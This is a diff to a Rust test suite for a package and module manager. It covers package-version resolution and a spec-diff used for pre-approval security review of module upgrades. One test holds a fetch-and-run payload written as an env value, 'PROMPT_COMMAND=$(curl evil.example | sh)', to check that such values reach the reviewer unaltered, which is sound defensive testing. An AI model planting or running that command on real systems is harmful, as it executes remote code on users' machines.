@@ -568,6 +568,82 @@ fn resolve_package_keeps_a_candidate_a_malformed_floor_could_not_judge() {
     );
 }
 
+/// A manager that cannot state what it OFFERS has shown nothing about the
+/// floor, so dropping the candidate on that answer deleted the package from
+/// the plan and aborted every command at config resolution. The declaration
+/// travels on instead, for the live check that owns the report.
+#[test]
+fn resolve_package_keeps_a_candidate_whose_manager_states_no_version() {
+    let quiet = MockManager::new("quiet-mgr");
+    let managers = make_manager_map(&[("quiet-mgr", &quiet)]);
+    let platform = linux_ubuntu_platform();
+
+    let entry = ModulePackageEntry {
+        name: "silent-pkg".into(),
+        min_version: Some("0.9".into()),
+        prefer: vec!["quiet-mgr".into()],
+        ..Default::default()
+    };
+
+    let result = resolve_package(&entry, "nvim", &platform, &managers, None)
+        .unwrap()
+        .expect("the package still resolves");
+    assert_eq!(result.manager, "quiet-mgr");
+    assert_eq!(result.version, None, "nothing was proven about the offer");
+    assert_eq!(
+        result.min_version.as_deref(),
+        Some("0.9"),
+        "and the floor travels on, for the check that names it"
+    );
+}
+
+/// A proven candidate outranks an earlier silent one: the author can observe
+/// which manager meets the floor, and that is the choice this order has always
+/// made.
+#[test]
+fn resolve_package_prefers_a_proven_candidate_over_an_earlier_silent_one() {
+    let quiet = MockManager::new("quiet-first");
+    let loud = MockManager::new("loud-second").with_package("paired-pkg", "1.4.0");
+    let managers = make_manager_map(&[("quiet-first", &quiet), ("loud-second", &loud)]);
+    let platform = linux_ubuntu_platform();
+
+    let entry = ModulePackageEntry {
+        name: "paired-pkg".into(),
+        min_version: Some("0.9".into()),
+        prefer: vec!["quiet-first".into(), "loud-second".into()],
+        ..Default::default()
+    };
+
+    let result = resolve_package(&entry, "nvim", &platform, &managers, None)
+        .unwrap()
+        .expect("the package resolves");
+    assert_eq!(result.manager, "loud-second");
+    assert_eq!(result.version, Some("1.4.0".into()));
+}
+
+/// A candidate that PROVES it offers below the floor is a fact and is passed
+/// over; the silent candidate ahead of it is what the entry falls back to.
+#[test]
+fn resolve_package_falls_back_to_the_silent_candidate_when_the_proven_one_is_below() {
+    let quiet = MockManager::new("quiet-ahead");
+    let low = MockManager::new("low-behind").with_package("shortfall-pkg", "0.2.0");
+    let managers = make_manager_map(&[("quiet-ahead", &quiet), ("low-behind", &low)]);
+    let platform = linux_ubuntu_platform();
+
+    let entry = ModulePackageEntry {
+        name: "shortfall-pkg".into(),
+        min_version: Some("0.9".into()),
+        prefer: vec!["quiet-ahead".into(), "low-behind".into()],
+        ..Default::default()
+    };
+
+    let result = resolve_package(&entry, "nvim", &platform, &managers, None)
+        .unwrap()
+        .expect("the package resolves");
+    assert_eq!(result.manager, "quiet-ahead");
+    assert_eq!(result.version, None);
+}
+
 #[test]
 fn resolve_package_unresolvable() {
     let apt = MockManager::new("apt").with_package("neovim", "0.6.1");
@@ -586,12 +662,12 @@ fn resolve_package_unresolvable() {
     };
 
     let result = resolve_package(&entry, "nvim", &platform, &managers, None);
-    assert!(result.is_err());
+    let err = result.unwrap_err().to_string();
+    assert!(err.contains("cannot be resolved"), "{err}");
     assert!(
-        result
-            .unwrap_err()
-            .to_string()
-            .contains("cannot be resolved")
+        err.contains("every available manager offers a version below the declared minVersion 0.9"),
+        "the refusal says WHICH of the two things it is, since a manager that \
+         was never asked successfully satisfies nothing either: {err}"
     );
 }
 
@@ -786,6 +862,10 @@ fn resolve_package_manager_not_registered() {
     assert!(
         err.contains("cannot be resolved"),
         "error should indicate unresolvable: {err}"
+    );
+    assert!(
+        err.contains("no manager for it is available on this host"),
+        "nothing was asked about a floor here: {err}"
     );
 }
 
@@ -1846,7 +1926,10 @@ fn diff_module_specs_no_changes() {
     };
 
     let changes = diff_module_specs(&module, &module, "->");
-    assert_eq!(changes, vec![(Role::Info, "(no spec changes)".to_string())]);
+    assert_eq!(
+        changes,
+        vec![SpecChange::of(Role::Info, "(no spec changes)")]
+    );
 }
 
 #[test]
@@ -1948,32 +2031,32 @@ fn diff_module_specs_detects_changes() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("dependency added: dep2"))
+            .any(|c| c.role == Role::Ok && c.subject.contains("dependency added: dep2"))
     );
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("package added: pkg3"))
+            .any(|c| c.role == Role::Ok && c.subject.contains("package added: pkg3"))
     );
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Fail && c.contains("package removed: pkg2"))
+            .any(|c| c.role == Role::Fail && c.subject.contains("package removed: pkg2"))
     );
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Warn && c.contains("package 'pkg1': minVersion"))
+            .any(|c| c.role == Role::Warn && c.subject.contains("package 'pkg1': minVersion"))
     );
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("file target"))
+            .any(|c| c.role == Role::Ok && c.subject.contains("file target"))
     );
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Fail && c.contains("file target"))
+            .any(|c| c.role == Role::Fail && c.subject.contains("file target"))
     );
 }
 
@@ -2335,19 +2418,165 @@ fn diff_module_specs_scripts_changed() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("postApply script added"))
+            .any(|c| c.role == Role::Ok && c.subject.contains("postApply script added"))
     );
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Fail && c.contains("postApply script removed"))
+            .any(|c| c.role == Role::Fail && c.subject.contains("postApply script removed"))
+    );
+
+    // A step whose body stands while a knob moved: the screen renders `timeout
+    // 300s` on the marker line, so the upgrade reports the change the reader
+    // would otherwise approve without seeing it.
+    let mut timeout_old = old.clone();
+    let mut timeout_new = old.clone();
+    timeout_old.spec.scripts = Some(crate::config::ScriptSpec {
+        post_apply: vec![crate::config::ScriptEntry::Full(
+            crate::config::ScriptCommand {
+                run: "echo same".to_string(),
+                ..Default::default()
+            },
+        )],
+        ..Default::default()
+    });
+    timeout_new.spec.scripts = Some(crate::config::ScriptSpec {
+        post_apply: vec![crate::config::ScriptEntry::Full(
+            crate::config::ScriptCommand {
+                run: "echo same".to_string(),
+                timeout: Some("300s".to_string()),
+                ..Default::default()
+            },
+        )],
+        ..Default::default()
+    });
+    let knob_changes = diff_module_specs(&timeout_old, &timeout_new, "->");
+    let scripts: Vec<(Role, &str)> = knob_changes
+        .iter()
+        .filter(|c| c.script.is_some())
+        .map(|c| (c.role, c.subject.as_str()))
+        .collect();
+    assert_eq!(
+        scripts,
+        vec![
+            (Role::Fail, "postApply script removed"),
+            (Role::Ok, "postApply script added"),
+        ],
+        "a timeout-only change reads as the old step going and the new one arriving"
     );
 }
 
-// `diff_module_specs` is the pre-approval security review of
-// a module upgrade — it must never condense/truncate a multi-line script
-// body, or the user approves running code they never saw. The rendering
-// decision (bullet vs code_block) belongs to the caller.
+#[test]
+fn diff_module_specs_reports_a_reordered_and_a_duplicated_script() {
+    let with_steps = |bodies: &[&str]| {
+        let mut module = LoadedModule {
+            version: None,
+            name: "test".into(),
+            spec: ModuleSpec {
+                platforms: vec![],
+                depends: vec![],
+                packages: vec![],
+                files: vec![],
+                env: vec![],
+                aliases: vec![],
+                scripts: None,
+                system: BTreeMap::new(),
+            },
+            dir: PathBuf::from("/tmp"),
+            origin: None,
+        };
+        module.spec.scripts = Some(crate::config::ScriptSpec {
+            post_apply: bodies
+                .iter()
+                .map(|b| crate::config::ScriptEntry::Simple((*b).to_string()))
+                .collect(),
+            ..Default::default()
+        });
+        module
+    };
+    let script_rows = |changes: Vec<SpecChange>| -> Vec<(Role, String, String)> {
+        changes
+            .iter()
+            .filter_map(|c| {
+                c.script
+                    .as_ref()
+                    .map(|s| (c.role, c.subject.clone(), s.entry.run_str().to_string()))
+            })
+            .collect()
+    };
+
+    // Both bodies still declared, in the other order: the machine now runs the
+    // migration before the build rather than after it.
+    let swapped = script_rows(diff_module_specs(
+        &with_steps(&["echo build", "echo migrate"]),
+        &with_steps(&["echo migrate", "echo build"]),
+        "->",
+    ));
+    assert_eq!(
+        swapped,
+        vec![
+            (
+                Role::Warn,
+                "postApply script moved".to_string(),
+                "echo migrate".to_string()
+            ),
+            (
+                Role::Warn,
+                "postApply script moved".to_string(),
+                "echo build".to_string()
+            ),
+        ],
+        "a reordered hook states both steps that moved"
+    );
+
+    // The same body a second time: the step runs twice now.
+    let duplicated = script_rows(diff_module_specs(
+        &with_steps(&["echo build"]),
+        &with_steps(&["echo build", "echo build"]),
+        "->",
+    ));
+    assert_eq!(
+        duplicated,
+        vec![(
+            Role::Ok,
+            "postApply script added".to_string(),
+            "echo build".to_string()
+        )],
+        "the extra copy is an addition, and the copy that kept its place is not a change"
+    );
+
+    // A copy taken away is the mirror of the one above.
+    let undoubled = script_rows(diff_module_specs(
+        &with_steps(&["echo build", "echo build"]),
+        &with_steps(&["echo build"]),
+        "->",
+    ));
+    assert_eq!(
+        undoubled,
+        vec![(
+            Role::Fail,
+            "postApply script removed".to_string(),
+            "echo build".to_string()
+        )],
+        "one of two identical steps going is a removal"
+    );
+
+    // An unchanged hook still reads as no change at all.
+    assert!(
+        script_rows(diff_module_specs(
+            &with_steps(&["echo build", "echo migrate"]),
+            &with_steps(&["echo build", "echo migrate"]),
+            "->",
+        ))
+        .is_empty(),
+        "a hook declared identically states nothing"
+    );
+}
+
+// `diff_module_specs` feeds the pre-approval security review of a module
+// upgrade, so it must never condense or truncate a multi-line script body: the
+// user would approve running code they never saw. The body travels as the
+// declared entry, and rendering it belongs to the screen.
 #[test]
 fn diff_module_specs_multiline_script_change_preserves_raw_body() {
     let old = LoadedModule {
@@ -2390,20 +2619,25 @@ fn diff_module_specs_multiline_script_change_preserves_raw_body() {
         origin: None,
     };
     let changes = diff_module_specs(&old, &new, "->");
-    let (script_role, script_change) = changes
+    let change = changes
         .iter()
-        .find(|(_, c)| c.contains("postApply script added"))
+        .find(|c| c.subject.contains("postApply script added"))
         .expect("script addition should be reported");
-    assert!(
-        script_change.contains("echo line-three"),
-        "diff must preserve the FULL raw body for pre-approval review, got: {script_change}"
-    );
-    assert_eq!(*script_role, Role::Ok);
+    assert_eq!(change.role, Role::Ok);
     assert_eq!(
-        script_change,
-        &format!("postApply script added: {raw_body}"),
-        "diff must push the raw body byte-identical, not condensed"
+        change.subject, "postApply script added",
+        "the row names the change; the body travels in `script`"
     );
+    let script = change
+        .script
+        .as_ref()
+        .expect("a script change carries the script it names");
+    assert_eq!(
+        script.entry.run_str(),
+        raw_body,
+        "the body must reach the screen byte-identical, not condensed"
+    );
+    assert_eq!((script.position, script.total), (1, 1));
 }
 
 fn module_with_env_and_aliases(env: &[(&str, &str)], aliases: &[(&str, &str)]) -> LoadedModule {
@@ -2444,19 +2678,25 @@ fn diff_module_specs_reports_env_additions_removals_and_edits() {
 
     let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes.contains(&(Role::Ok, "env added: ADDED=y".to_string())),
+        changes
+            .iter()
+            .any(|c| c.role == Role::Ok && c.subject == "env added: ADDED=y"),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&(Role::Fail, "env removed: GONE=x".to_string())),
+        changes
+            .iter()
+            .any(|c| c.role == Role::Fail && c.subject == "env removed: GONE=x"),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&(Role::Warn, "env 'EDIT': old -> new".to_string())),
+        changes
+            .iter()
+            .any(|c| c.role == Role::Warn && c.subject == "env 'EDIT': old -> new"),
         "{changes:?}"
     );
     assert!(
-        !changes.iter().any(|(_, c)| c.contains("KEEP")),
+        !changes.iter().any(|c| c.subject.contains("KEEP")),
         "{changes:?}"
     );
 }
@@ -2469,19 +2709,25 @@ fn diff_module_specs_reports_alias_additions_removals_and_edits() {
 
     let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes.contains(&(Role::Ok, "alias added: added=bat".to_string())),
+        changes
+            .iter()
+            .any(|c| c.role == Role::Ok && c.subject == "alias added: added=bat"),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&(Role::Fail, "alias removed: gone=cat".to_string())),
+        changes
+            .iter()
+            .any(|c| c.role == Role::Fail && c.subject == "alias removed: gone=cat"),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&(Role::Warn, "alias 'edit': vi -> nvim".to_string())),
+        changes
+            .iter()
+            .any(|c| c.role == Role::Warn && c.subject == "alias 'edit': vi -> nvim"),
         "{changes:?}"
     );
     assert!(
-        !changes.iter().any(|(_, c)| c.contains("keep")),
+        !changes.iter().any(|c| c.subject.contains("keep")),
         "{changes:?}"
     );
 }
@@ -2499,14 +2745,14 @@ fn diff_module_specs_pushes_env_and_alias_payloads_raw() {
 
     let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes.contains(&(
-            Role::Ok,
-            "env added: PROMPT_COMMAND=$(curl evil.example | sh)".to_string()
-        )),
+        changes.iter().any(|c| c.role == Role::Ok
+            && c.subject == "env added: PROMPT_COMMAND=$(curl evil.example | sh)"),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&(Role::Ok, "alias added: ls=line-one\nline-two".to_string())),
+        changes
+            .iter()
+            .any(|c| c.role == Role::Ok && c.subject == "alias added: ls=line-one\nline-two"),
         "{changes:?}"
     );
 }
@@ -2516,7 +2762,7 @@ fn diff_module_specs_identical_env_and_aliases_report_no_changes() {
     let module = module_with_env_and_aliases(&[("A", "1")], &[("b", "c")]);
     assert_eq!(
         diff_module_specs(&module, &module, "->"),
-        vec![(Role::Info, "(no spec changes)".to_string())]
+        vec![SpecChange::of(Role::Info, "(no spec changes)")]
     );
 }
 
@@ -2637,7 +2883,10 @@ fn diff_module_specs_no_changes_default() {
     let old = make_loaded_module("test", spec.clone());
     let new = make_loaded_module("test", spec);
     let changes = diff_module_specs(&old, &new, "->");
-    assert_eq!(changes, vec![(Role::Info, "(no spec changes)".to_string())]);
+    assert_eq!(
+        changes,
+        vec![SpecChange::of(Role::Info, "(no spec changes)")]
+    );
 }
 
 #[test]
@@ -2652,7 +2901,7 @@ fn diff_module_specs_added_dependency() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("dependency added: core"))
+            .any(|c| c.role == Role::Ok && c.subject.contains("dependency added: core"))
     );
 }
 
@@ -2668,7 +2917,7 @@ fn diff_module_specs_removed_dependency() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Fail && c.contains("dependency removed: core"))
+            .any(|c| c.role == Role::Fail && c.subject.contains("dependency removed: core"))
     );
 }
 
@@ -2687,7 +2936,7 @@ fn diff_module_specs_added_package() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("package added: ripgrep"))
+            .any(|c| c.role == Role::Ok && c.subject.contains("package added: ripgrep"))
     );
 }
 
@@ -2706,7 +2955,7 @@ fn diff_module_specs_removed_package() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Fail && c.contains("package removed: vim"))
+            .any(|c| c.role == Role::Fail && c.subject.contains("package removed: vim"))
     );
 }
 
@@ -2732,10 +2981,10 @@ fn diff_module_specs_package_version_change() {
     };
     let new = make_loaded_module("test", new_spec);
     let changes = diff_module_specs(&old, &new, "->");
-    assert!(changes.iter().any(|(role, c)| *role == Role::Warn
-        && c.contains("kubectl")
-        && c.contains("1.28")
-        && c.contains("1.30")));
+    assert!(changes.iter().any(|c| c.role == Role::Warn
+        && c.subject.contains("kubectl")
+        && c.subject.contains("1.28")
+        && c.subject.contains("1.30")));
 }
 
 #[test]
@@ -2758,7 +3007,7 @@ fn diff_module_specs_added_file() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("file target added: ~/.zshrc"))
+            .any(|c| c.role == Role::Ok && c.subject.contains("file target added: ~/.zshrc"))
     );
 }
 
@@ -4599,20 +4848,20 @@ fn diff_module_specs_file_changes() {
     let changes = diff_module_specs(&old, &new, "->");
     let joined = changes
         .iter()
-        .map(|(_, c)| c.as_str())
+        .map(|c| c.subject.as_str())
         .collect::<Vec<_>>()
         .join("\n");
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c == "file target added: ~/.config/app/new.conf"),
+            .any(|c| c.role == Role::Ok && c.subject == "file target added: ~/.config/app/new.conf"),
         "should show added file: {joined}"
     );
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Fail
-                && c == "file target removed: ~/.config/app/old.conf"),
+            .any(|c| c.role == Role::Fail
+                && c.subject == "file target removed: ~/.config/app/old.conf"),
         "should show removed file: {joined}"
     );
     // shared.conf should NOT appear in changes
@@ -4660,8 +4909,8 @@ fn diff_module_specs_env_only_change_is_still_a_change() {
     assert_eq!(
         changes,
         vec![
-            (Role::Ok, "env added: NEW=2".to_string()),
-            (Role::Fail, "env removed: OLD=1".to_string()),
+            SpecChange::of(Role::Ok, "env added: NEW=2"),
+            SpecChange::of(Role::Fail, "env removed: OLD=1"),
         ]
     );
 }
@@ -5168,9 +5417,11 @@ fn diff_module_specs_scripts_none_to_some() {
     let new = make_loaded_module("test", new_spec);
     let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes
-            .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("postApply script added: echo hello")),
+        changes.iter().any(|c| c.role == Role::Ok
+            && c.subject == "postApply script added"
+            && c.script
+                .as_ref()
+                .is_some_and(|s| s.entry.run_str() == "echo hello")),
         "should detect added script: {changes:?}"
     );
 }
@@ -5190,10 +5441,11 @@ fn diff_module_specs_scripts_some_to_none() {
     let new = make_loaded_module("test", ModuleSpec::default());
     let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes
-            .iter()
-            .any(|(role, c)| *role == Role::Fail
-                && c.contains("postApply script removed: echo goodbye")),
+        changes.iter().any(|c| c.role == Role::Fail
+            && c.subject == "postApply script removed"
+            && c.script
+                .as_ref()
+                .is_some_and(|s| s.entry.run_str() == "echo goodbye")),
         "should detect removed script: {changes:?}"
     );
 }
@@ -5228,7 +5480,7 @@ fn diff_module_specs_system_changes_not_tracked() {
     let changes = diff_module_specs(&old, &new, "->");
     assert_eq!(
         changes,
-        vec![(Role::Info, "(no spec changes)".to_string())],
+        vec![SpecChange::of(Role::Info, "(no spec changes)")],
         "system changes are not tracked by diff"
     );
 }
@@ -5656,7 +5908,7 @@ fn diff_module_specs_prefer_list_change_not_tracked() {
     let changes = diff_module_specs(&old, &new, "->");
     assert_eq!(
         changes,
-        vec![(Role::Info, "(no spec changes)".to_string())],
+        vec![SpecChange::of(Role::Info, "(no spec changes)")],
         "prefer list changes are not tracked"
     );
 }
@@ -6369,7 +6621,7 @@ fn load_modules_oversized_file_in_modules_dir_rejected() {
 /// when the `modules/` directory itself is not readable (Unix only; skip as root).
 #[test]
 #[cfg(unix)]
-fn load_modules_unreadable_directory_errors() {
+fn load_modules_unreadable_directory_errors_as_non_root() {
     use std::os::unix::fs::PermissionsExt;
 
     // Running as root bypasses permission checks — skip to avoid false pass.
@@ -6404,11 +6656,11 @@ fn load_modules_unreadable_directory_errors() {
 /// succeeds) but cannot be read because permissions are removed (Unix only, non-root).
 #[test]
 #[cfg(unix)]
-fn load_module_unreadable_yaml_errors() {
+fn load_module_unreadable_yaml_errors_as_non_root() {
     use std::os::unix::fs::PermissionsExt;
 
     if crate::is_root() {
-        return;
+        return; // root reads a 0o000 module.yaml; the read failure cannot be staged
     }
 
     let dir = tempfile::tempdir().unwrap();
